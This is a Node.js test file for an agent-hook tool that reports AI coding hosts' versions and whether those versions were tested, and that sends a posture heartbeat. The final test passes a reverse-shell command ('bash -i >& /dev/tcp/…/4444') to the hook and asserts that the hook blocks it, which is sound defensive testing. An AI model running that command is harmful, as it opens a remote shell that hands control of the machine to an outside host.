// Host version in the posture report (cli/agent-hooks/host-version.mjs via cli/agent-posture.mjs):
// each host entry carries `version` and `tested` (against data/host-versions.json). Report-only and
// content-free: the version is read from the env var the CALLING host sets for its hooks, else from a
// no-spawn PATH probe, else from one cached `<bin> --version`; anything that is not a plain version
// string is dropped.
//
//   node --test --import ./test/hermetic-env.mjs test/agent-posture-version.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, symlinkSync, chmodSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { agentPosture } from "../cli/agent-posture.mjs";
import { parseVersion, versionFromEnv, isTested, probeVersion, loadManifest, compareVersions } from "../cli/agent-hooks/host-version.mjs";
import { makeSandbox } from "../cli/doctor-sandbox.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const MANIFEST = loadManifest();
const T = (h) => MANIFEST.hosts[h].tested;
const dashed = (v) => v.replace(/\./g, "-");
const NO_SYSTEM = { gemini: "/nonexistent/moorai-test/gemini-system.json" };
const posix = process.platform !== "win32";

function sandbox(t) {
  const base = mkdtempSync(join(tmpdir(), "moorai-posture-ver-"));
  t.after(() => rmTree(base));
  const home = join(base, "home"), proj = join(base, "proj"), bin = join(base, "bin");
  for (const d of [home, proj, bin]) mkdirSync(d, { recursive: true });
  const write = (p, body) => { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, typeof body === "string" ? body : JSON.stringify(body)); };
  // Claude Code is "present" once ~/.claude/projects has a session file.
  write(join(home, ".claude", "projects", "p", "s.jsonl"), "{}\n");
  const posture = (env, o = {}) => agentPosture({ home, env: { HOME: home, ...env }, cwd: proj, managedSources: [], systemFiles: NO_SYSTEM, hookCheck: false, ...o });
  return { base, home, proj, bin, write, posture };
}
const hostOf = (p, id) => p.hosts.find((h) => h.host === id);

test("MANIFEST: every adapter host has a tested version, and the adapters point at the manifest", () => {
  for (const id of ["claude-code", "codex", "copilot", "cursor", "gemini"]) {
    assert.ok(parseVersion(T(id)), `${id} tested version`);
    assert.ok(Array.isArray(MANIFEST.hosts[id].tests) && MANIFEST.hosts[id].tests.every((f) => existsSync(join(ROOT, f))), `${id} tests exist`);
  }
  for (const id of ["codex", "copilot", "cursor", "gemini"]) {
    assert.match(readFileSync(join(ROOT, "cli", "agent-hooks", `${id}.mjs`), "utf8"), /data\/host-versions\.json/, `${id}.mjs cites the manifest`);
  }
});

test("PARSE: the version lines the hosts print", () => {
  assert.equal(parseVersion("2.1.284 (Claude Code)"), "2.1.284");
  assert.equal(parseVersion("codex-cli 0.154.0"), "0.154.0");
  assert.equal(parseVersion("2026.05.27-fe9a6e2\n"), "2026.05.27-fe9a6e2");
  assert.equal(parseVersion("0.60.0"), "0.60.0");
  assert.equal(parseVersion("no version here"), null);
  assert.equal(compareVersions("0.155.0", "0.154.0"), 1);
  assert.equal(compareVersions("2026.05.27-fe9a6e2", "2026.05.27"), 0);
});

test("ENV: Claude Code's AI_AGENT and Cursor's CURSOR_VERSION; anything else is not a version", () => {
  assert.equal(versionFromEnv("claude-code", { AI_AGENT: "claude-code_2-1-284_harness" }), "2.1.284");
  assert.equal(versionFromEnv("claude-code", { AI_AGENT: "claude-code_2-1-288_agent" }), "2.1.288");
  assert.equal(versionFromEnv("claude-code", { AI_AGENT: "cursor_1-2-3_agent" }), null);
  assert.equal(versionFromEnv("cursor", { CURSOR_VERSION: "2026.05.27-fe9a6e2" }), "2026.05.27-fe9a6e2");
  assert.equal(versionFromEnv("cursor", { CURSOR_VERSION: "/Users/alice/secret-project" }), null, "a path never passes");
  assert.equal(versionFromEnv("cursor", { CURSOR_VERSION: "1.0.0" }), null, "cursor-agent's no-version fallback");
  assert.equal(versionFromEnv("codex", { AI_AGENT: "claude-code_2-1-284_harness", CURSOR_VERSION: "1.2.3" }), null);
  assert.equal(isTested("codex", T("codex")), true);
  assert.equal(isTested("codex", "0.155.0"), false);
  assert.equal(isTested("codex", null), false);
});

test("POSTURE: the calling Claude Code's version is reported, tested against the manifest", (t) => {
  const s = sandbox(t);
  let c = hostOf(s.posture({ AI_AGENT: `claude-code_${dashed(T("claude-code"))}_harness` }, { caller: "claude-code" }), "claude-code");
  assert.equal(c.version, T("claude-code"));
  assert.equal(c.tested, true);
  c = hostOf(s.posture({ AI_AGENT: "claude-code_9-9-999_harness" }, { caller: "claude-code" }), "claude-code");
  assert.deepEqual([c.version, c.tested], ["9.9.999", false], "a newer, untested version shows up as untested");
  c = hostOf(s.posture({}, { caller: "claude-code" }), "claude-code");
  assert.deepEqual([c.version, c.tested], [null, false], "unknown is untested, never a guess");
});

test("POSTURE: hook env is inherited, so it is read only for the host that is calling", (t) => {
  const s = sandbox(t);
  const c = hostOf(s.posture({ AI_AGENT: `claude-code_${dashed(T("claude-code"))}_harness` }, { caller: "cursor" }), "claude-code");
  assert.deepEqual([c.version, c.tested], [null, false]);
  const cur = hostOf(s.posture({ CURSOR_VERSION: T("cursor") }, { caller: "cursor" }), "cursor");
  assert.deepEqual([cur.version, cur.tested], [T("cursor"), true]);
});

test("PROBE (no spawn): an npm install's package.json and a native installer's versions/<v>/ path", { skip: !posix }, (t) => {
  const s = sandbox(t);
  const pkg = join(s.base, "lib", "node_modules", "@openai", "codex");
  s.write(join(pkg, "package.json"), { name: "@openai/codex", version: "0.199.0" });
  s.write(join(pkg, "bin", "codex.js"), "#!/bin/sh\necho SPAWNED >> " + join(s.base, "spawned") + "\n");
  chmodSync(join(pkg, "bin", "codex.js"), 0o755);
  symlinkSync(join(pkg, "bin", "codex.js"), join(s.bin, "codex"));
  const native = join(s.base, "share", "claude", "versions", T("claude-code"));
  s.write(native, "#!/bin/sh\necho SPAWNED >> " + join(s.base, "spawned") + "\n");
  chmodSync(native, 0o755);
  symlinkSync(native, join(s.bin, "claude"));
  const p = s.posture({ PATH: s.bin }, { caller: "codex" });
  assert.deepEqual([hostOf(p, "codex").version, hostOf(p, "codex").tested], ["0.199.0", false]);
  assert.deepEqual([hostOf(p, "claude-code").version, hostOf(p, "claude-code").tested], [T("claude-code"), true]);
  assert.equal(existsSync(join(s.base, "spawned")), false, "neither binary was run");
  assert.equal(existsSync(join(s.home, ".moorai", "host-version-cache.json")), false, "a path answer is not cached: the beat worker writes nothing into the state dir");
});

test("PROBE (spawn): `--version` runs once, then the cache answers until the binary changes", { skip: !posix }, (t) => {
  const s = sandbox(t);
  const count = join(s.base, "count");
  const script = (v) => `#!/bin/sh\necho x >> ${count}\necho "${v}"\n`;
  writeFileSync(join(s.bin, "gemini"), script(T("gemini")));
  chmodSync(join(s.bin, "gemini"), 0o755);
  const stateDir = join(s.home, ".moorai");
  const probe = () => probeVersion("gemini", { env: { PATH: s.bin, HOME: s.home }, stateDir });
  assert.deepEqual(probe(), { version: T("gemini"), source: "spawn" });
  assert.deepEqual(probe(), { version: T("gemini"), source: "spawn" });
  assert.equal(readFileSync(count, "utf8").trim().split("\n").length, 1, "second call served from the cache");
  writeFileSync(join(s.bin, "gemini"), script("0.61.0") + "\n");
  assert.equal(probe().version, "0.61.0", "an upgraded binary is probed again");
  const cache = readFileSync(join(stateDir, "host-version-cache.json"), "utf8");
  assert.ok(!/count|SPAWN/.test(cache));
});

test("PROBE: junk from `--version` is not reported", { skip: !posix }, (t) => {
  const s = sandbox(t);
  writeFileSync(join(s.bin, "copilot"), "#!/bin/sh\necho 'error: /Users/alice/.copilot/config.json unreadable'\nexit 1\n");
  chmodSync(join(s.bin, "copilot"), 0o755);
  assert.deepEqual(probeVersion("copilot", { env: { PATH: s.bin, HOME: s.home } }), { version: null, source: null });
});

// The real path: hook process env -> detached posture-beat worker -> POST /api/agent-posture.
async function consoleStub(t) {
  const posts = [];
  const srv = createServer((req, res) => {
    let b = "";
    req.on("data", (c) => (b += c));
    req.on("end", () => { if (req.url === "/api/agent-posture") posts.push(JSON.parse(b)); res.writeHead(201); res.end("{}"); });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  t.after(() => srv.close());
  return { url: `http://127.0.0.1:${srv.address().port}`, posts };
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(fn, ms = 10000) { const end = Date.now() + ms; while (Date.now() < end) { if (fn()) return true; await sleep(100); } return false; }

test("BEAT: the heartbeat carries version + tested for the calling host, and the verdict is unchanged", async (t) => {
  const c = await consoleStub(t);
  const empty = mkdtempSync(join(tmpdir(), "moorai-beat-ver-"));
  const sb = makeSandbox({ realHome: empty, config: { serverUrl: c.url, tenant: "acme", installToken: "tok" } });
  t.after(() => { sb.cleanup(); rmTree(empty); });
  const run = (file, args, extra, cmd) => spawnSync(process.execPath, [file, ...args], {
    input: JSON.stringify({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: cmd }, session_id: "s-1", cwd: sb.proj }),
    env: sb.env({ PATH: "/usr/bin:/bin", AI_AGENT: "", CURSOR_VERSION: "", ...extra }), encoding: "utf8", timeout: 20000
  });
  const r = run(join(ROOT, "cli", "moorai-hook.mjs"), [], { AI_AGENT: "claude-code_9-9-999_harness" }, "ls -la");
  assert.equal(r.status, 0);
  assert.ok(await until(() => c.posts.length === 1), "heartbeat posted");
  const cc = c.posts[0].posture.hosts.find((h) => h.host === "claude-code");
  assert.equal(cc.version, "9.9.999");
  assert.equal(cc.tested, false);
  const raw = JSON.stringify(c.posts[0]);
  assert.ok(!raw.includes(sb.home) && !raw.includes(sb.proj), "no paths leave the device");

  // Same deny for the same command with and without a version in the env.
  const deny = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1";
  const a = run(join(ROOT, "cli", "moorai-hook.mjs"), [], { AI_AGENT: "claude-code_9-9-999_harness" }, deny);
  const b = run(join(ROOT, "cli", "moorai-hook.mjs"), [], {}, deny);
  assert.equal(a.status, b.status);
  assert.equal(a.stdout, b.stdout);
  assert.match(a.stdout, /deny|block/);
});
